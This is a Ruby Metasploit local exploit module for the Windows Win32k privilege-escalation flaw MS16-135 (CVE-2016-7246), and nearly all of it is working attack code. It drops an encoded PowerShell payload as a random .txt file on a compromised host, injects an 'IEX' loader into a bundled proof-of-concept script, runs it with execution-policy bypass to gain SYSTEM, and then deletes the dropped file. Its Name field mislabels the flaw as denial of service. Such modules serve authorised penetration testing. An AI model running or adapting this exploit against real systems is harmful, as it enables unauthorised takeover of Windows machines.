##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload_generator'
require 'msf/core/exploit/powershell'
class MetasploitModule < Msf::Exploit::Local

  Rank = NormalRanking

  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::File
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'MS16-135 Microsoft Windows Kernel - win32k Denial of Service',
      'Description'   => %q{
         The kernel-mode drivers in Microsoft Windows Server 2008 R2 SP1, 
                                              Windows 7 SP1, 
                                              Windows 8.1, 
                                              Windows Server 2012 Gold and R2, 
                                              Windows RT 8.1, 
                                              Windows 10 Gold, 1511, and 1607, 
         and Windows Server 2016 allow local users to gain privileges via a crafted application, 
         aka "Win32k Elevation of Privilege Vulnerability."
      },
      'License'       => BSD_LICENSE,
      'Author'        =>
         [
           'b33f',               # @FuzzySec, http://www.fuzzysecurity.com'
           'Evi1cg',             # https://evi1cg.me/
           'LateRain@Syclover',  # http://syclover.sinaapp.com/
           'Exist@Syclover'
         ],
      'References'    =>
         [
           [ 'MS', 'MS16-135'],
           [ 'CVE', '2016-7246'],
           [ 'URL', 'https://technet.microsoft.com/zh-cn/library/security/MS16-135' ],
           [ 'URL', 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7246']
         ],
      'DefaultOptions' =>
          {
            'WfsDelay' => 30,
            'EXITFUNC' => 'thread'
          },
      'DisclosureDate' => 'Nov 10 2016',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'        =>
          [
            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
          ],
        'DefaultTarget' => 0
      ))
  end

  def check
    os = sysinfo["OS"]

    if os !~ /win/i || session.arch != 'x64'
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end
 
    Exploit::CheckCode::Detected
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "Target is not vulnerable")
    end

    # Exploit PoC from 'b33f' and rewrite by 'Evilcg'
    ps_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-7246', 'cve_2016_7246.ps1')
    ms16_135 = File.read(ps_path) 

    # payload formatted to fit dropped text file
   payl = cmd_psh_payload(payload.encoded,payload.arch,{
      encode_final_payload: true,
      remove_comspec: true,
      method: 'reflection'
    })

    

    @upfile=Rex::Text.rand_text_alpha((rand(8)+6))+".txt"
    path = datastore['W_PATH'] || pwd
    @upfile = "#{path}\\#{@upfile}"
    fd = session.fs.file.new(@upfile,"wb")
    print_status("Writing payload file, #{@upfile}...")
    fd.write(payl)
    fd.close
    psh_cmd = "IEX `$(gc #{@upfile})"
   
    ms16_135.gsub!("$psh_cmd", "\"#{psh_cmd}\"")    

    print_status("Executing exploit script...")
    cmd = "powershell -exec Bypass  #{compress_script(ms16_135)}"
    args = nil

    begin
      process = session.sys.process.execute(cmd, args, {
        'Hidden' => false,
        'Channelized' => false
      })
    rescue
      print_error("An error occurred executing the script.")
    end
  end

  def cleanup
    begin
      rm_f(@upfile)
      print_good("Cleaned up #{@upfile}")
    rescue
      print_error("There was an issue with cleanup of the powershell payload script.")
    end
  end
end
